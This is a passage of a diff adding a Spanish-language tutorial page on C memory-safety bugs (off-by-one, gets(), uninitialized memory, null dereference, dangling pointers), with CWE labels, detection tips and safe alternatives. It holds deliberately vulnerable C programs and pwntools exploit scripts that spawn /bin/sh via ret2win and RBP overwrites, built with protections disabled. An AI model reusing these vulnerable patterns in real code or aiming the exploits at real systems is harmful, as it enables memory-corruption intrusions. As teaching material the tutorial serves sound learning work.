+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10</span>; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>        buf[i] <span style="color:#f92672">=</span> input[i];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Variante con strcpy y null terminator:
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable2</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>src) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> dst[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// strncpy NO agrega \0 si src tiene &gt;= 8 chars
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>(dst, src, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>    dst[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;  <span style="color:#75715e">// 💥 fuera del buffer por 1 byte
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(dst);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="off-by-one-en-el-heap">Off-by-one en el heap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Sobrescribir el byte &#39;size&#39; del siguiente chunk en el heap
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>} Chunk;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln_heap_obo</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input) {
+</span></span><span style="display:flex;"><span>    Chunk <span style="color:#f92672">*</span>a <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>    Chunk <span style="color:#f92672">*</span>b <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// strlen puede devolver 8, entonces copia 9 bytes con \0
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 el \0 pisa el byte bajo del &#39;size&#39; field de b
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(a<span style="color:#f92672">-&gt;</span>name, input, <span style="color:#a6e22e">strlen</span>(input) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--stack-off-by-one">Exploit — stack off-by-one</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_obo.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El byte extra sobrescribe el byte bajo de saved RBP</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cuando la función retorna, RBP apunta a una dirección controlada</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Si el epilogo usa &#39;leave&#39; (mov rsp, rbp; pop rbp), podemos controlar RSP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln_obo&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 10 bytes de relleno + 1 byte que pisa saved RBP (byte bajo)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Apuntamos RBP hacia una zona con nuestro shellcode o gadget</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#39;</span>   <span style="color:#75715e"># cambia byte bajo de RBP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="cómo-compilar-1">Cómo compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_obo vuln_obo.c -fno-stack-protector -no-pie -g
+</span></span><span style="display:flex;"><span>gdb vuln_obo
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (gdb) b vulnerable</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (gdb) run AAAAAAAAAA   # 10 As</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (gdb) x/20xb &amp;buf      # inspeccionar memoria</span>
+</span></span></code></pre></div><hr>
+<h2 id="3-gets--función-removida-con-razón">3. gets() — función removida con razón</h2>
+<p><strong>CWE-242</strong> — Crítico</p>
+<h3 id="mecanismo-2">Mecanismo</h3>
+<p><code>gets()</code> no tiene parámetro de longitud. Lee hasta <code>\n</code> o EOF sin importar el tamaño del buffer.
+Fue eliminada del estándar en C11, pero código legacy la sigue usando.
+Es el BOF más simple posible — sin ningún argumento extra.</p>
+<h3 id="código-vulnerable-2">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_gets.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Shell!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Ingresá texto: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span>(buf);   <span style="color:#75715e">// 💥 sin límite, desborda stack trivialmente
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Dijiste: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_gets.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./vuln_gets&#39;</span>)
+</span></span><span style="display:flex;"><span>p   <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln_gets&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WIN  <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;win&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset: 64 (buf) + 8 (saved rbp) = 72</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En algunos casos con alineación de stack: +8 más para ret2win</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(WIN)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;texto: &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="cómo-compilar-2">Cómo compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># -w suprime el warning de gets() (para que compile limpio como legacy)</span>
+</span></span><span style="display:flex;"><span>gcc -o vuln_gets vuln_gets.c -fno-stack-protector -no-pie -w
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encontrar offset exacto con pwndbg:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwndbg&gt; cyclic 100</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwndbg&gt; run</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (pegar cyclic output cuando pide input)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwndbg&gt; cyclic -l $rsp   (o $eip en 32bit)</span>
+</span></span></code></pre></div><h3 id="funciones-igualmente-peligrosas">Funciones igualmente peligrosas</h3>
+<table>
+	<thead>
+			<tr>
+					<th>Función vulnerable</th>
+					<th>Alternativa segura</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>gets(buf)</code></td>
+					<td><code>fgets(buf, sizeof(buf), stdin)</code></td>
+			</tr>
+			<tr>
+					<td><code>strcpy(dst, src)</code></td>
+					<td><code>strncpy(dst, src, sizeof(dst)-1)</code></td>
+			</tr>
+			<tr>
+					<td><code>strcat(dst, src)</code></td>
+					<td><code>strncat(dst, src, sizeof(dst)-strlen(dst)-1)</code></td>
+			</tr>
+			<tr>
+					<td><code>sprintf(buf, fmt, ...)</code></td>
+					<td><code>snprintf(buf, sizeof(buf), fmt, ...)</code></td>
+			</tr>
+			<tr>
+					<td><code>scanf(&quot;%s&quot;, buf)</code></td>
+					<td><code>scanf(&quot;%63s&quot;, buf)</code> (con límite)</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="4-uninitialized-memory">4. Uninitialized Memory</h2>
+<p><strong>CWE-457</strong> — Medio/Alto</p>
+<h3 id="mecanismo-3">Mecanismo</h3>
+<p>Una variable local no se inicializa. En el stack, contiene basura del frame anterior.
+Si el atacante puede controlar qué había en el stack antes de llamar a la función, controla el valor &ldquo;no inicializado&rdquo;.
+En el heap, <code>malloc()</code> tampoco inicializa (usar <code>calloc()</code> si se necesita cero).</p>
+<h3 id="código-vulnerable-3">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_uninit.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">check_password</span>(<span style="color:#66d9ef">int</span> stored_hash) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> guess;   <span style="color:#75715e">// ← sin inicializar, basura del stack
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Dependiendo de qué había en el stack, puede ser 0, o coincidir
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Tu &#39;guess&#39; es: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, guess);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (guess <span style="color:#f92672">==</span> stored_hash)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;   <span style="color:#75715e">// gana si la basura coincide
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Ejemplo más explotable: struct en heap sin inicializar
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>  is_admin;   <span style="color:#75715e">// 0 = user, 1 = admin
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">56</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>handler)();
+</span></span><span style="display:flex;"><span>} Session;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Session <span style="color:#f92672">*</span><span style="color:#a6e22e">create_session</span>() {
+</span></span><span style="display:flex;"><span>    Session <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(Session));
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 no se hace memset(s, 0, sizeof(Session))
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// is_admin y handler contienen lo que había antes en ese chunk
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(s<span style="color:#f92672">-&gt;</span>name, <span style="color:#e6db74">&#34;guest&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Trick: alocar y liberar algo primero para &#34;plantar&#34; datos
+</span></span></span><span style="display:flex;"><span>    Session <span style="color:#f92672">*</span>poison <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(Session));
+</span></span><span style="display:flex;"><span>    poison<span style="color:#f92672">-&gt;</span>is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    poison<span style="color:#f92672">-&gt;</span>handler  <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)()) system;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(poison);   <span style="color:#75715e">// va a la freelist
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create_session() obtiene el mismo chunk → datos no borrados
+</span></span></span><span style="display:flex;"><span>    Session <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_session</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;is_admin = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s<span style="color:#f92672">-&gt;</span>is_admin);   <span style="color:#75715e">// imprime 1
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (s<span style="color:#f92672">-&gt;</span>is_admin) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;¡Acceso admin concedido!&#34;</span>);
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handler</span>();  <span style="color:#75715e">// llama a system() con basura como arg — crash o exploit
+</span></span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--heap-grooming">Exploit — heap grooming</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_uninit.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Técnica: &#34;heap grooming&#34; — controlar qué datos quedan en el chunk</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># antes de que la víctima lo reutilice sin inicializar</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln_uninit&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># No hace falta enviar nada especial:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># el programa en sí demuestra el bug al &#34;plantar&#34; datos</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En exploits reales, se controla la secuencia de alloc/free</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># para que el chunk &#34;contaminado&#34; sea reutilizado</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="detección">Detección</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># valgrind detecta uso de memoria no inicializada</span>
+</span></span><span style="display:flex;"><span>valgrind --track-origins<span style="color:#f92672">=</span>yes ./vuln_uninit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># AddressSanitizer + MemorySanitizer</span>
+</span></span><span style="display:flex;"><span>gcc -fsanitize<span style="color:#f92672">=</span>memory -fno-omit-frame-pointer -o vuln_uninit vuln_uninit.c
+</span></span></code></pre></div><hr>
+<h2 id="5-null-pointer-dereference">5. Null Pointer Dereference</h2>
+<p><strong>CWE-476</strong> — Medio</p>
+<h3 id="mecanismo-4">Mecanismo</h3>
+<p><code>malloc()</code> devuelve <code>NULL</code> cuando falla. Si no se verifica y se desreferencia, SIGSEGV.
+En Linux, si se puede mapear la página 0 (<code>mmap</code> a NULL), se puede convertir en ejecución de código.</p>
+<h3 id="código-vulnerable-4">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_nullptr.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>callback)();
+</span></span><span style="display:flex;"><span>} Buffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">safe_func</span>()  { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;función normal&#34;</span>); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">evil_func</span>()  { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;PWNED&#34;</span>); <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>); }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// malloc falla si el sistema está bajo memoria
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// o si se pide demasiado
+</span></span></span><span style="display:flex;"><span>    Buffer <span style="color:#f92672">*</span>b <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">1</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 sin verificar si b == NULL
+</span></span></span><span style="display:flex;"><span>    b<span style="color:#f92672">-&gt;</span>callback <span style="color:#f92672">=</span> safe_func;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(b<span style="color:#f92672">-&gt;</span>data, argv[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>    b<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callback</span>();    <span style="color:#75715e">// si b == NULL → dereference de dirección 0x18
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--null-page-mapping-linux-histérico">Exploit — null page mapping (Linux histérico)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_nullptr.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En kernels viejos (&lt; 3.5) era posible mapear la página NULL</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En kernels modernos: vm.mmap_min_addr = 65536 lo previene</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Igual útil en embedded y kernels sin esta protección</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ctypes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En el contexto de un kernel exploit antiguo:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS, -1, 0)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Escribir shellcode en dirección 0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. El null deref salta a nuestro shellcode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Demostración conceptual:</span>
+</span></span><span style="display:flex;"><span>shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000000018</span>  <span style="color:#75715e"># offset del campo callback en Buffer</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;El programa saltará a: </span><span style="color:#e6db74">{</span>hex(shellcode_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;En kernel viejo: mapear NULL page + escribir shellcode ahí&#34;</span>)
+</span></span></code></pre></div><h3 id="cómo-compilar-y-probar">Cómo compilar y probar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_nullptr vuln_nullptr.c -no-pie
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Forzar fallo de malloc con valor gigante:</span>
+</span></span><span style="display:flex;"><span>./vuln_nullptr <span style="color:#ae81ff">999999999999</span> <span style="color:#e6db74">&#34;test&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → SIGSEGV en b-&gt;callback = safe_func</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ver el crash:</span>
+</span></span><span style="display:flex;"><span>dmesg | tail -5
+</span></span></code></pre></div><hr>
+<h2 id="6-dangling-pointer-a-variable-local">6. Dangling Pointer a Variable Local</h2>
+<p><strong>CWE-825</strong> — Alto</p>
+<h3 id="mecanismo-5">Mecanismo</h3>
+<p>Una función retorna un puntero a una variable local. Cuando la función termina,
+esa variable se va del stack. El puntero queda &ldquo;colgando&rdquo; apuntando a memoria que ya no es válida.
+Llamadas subsiguientes sobreescriben esa área del stack → el puntero ahora apunta a datos controlables.</p>
+<h3 id="código-vulnerable-5">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_dangling.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">get_value</span>() {
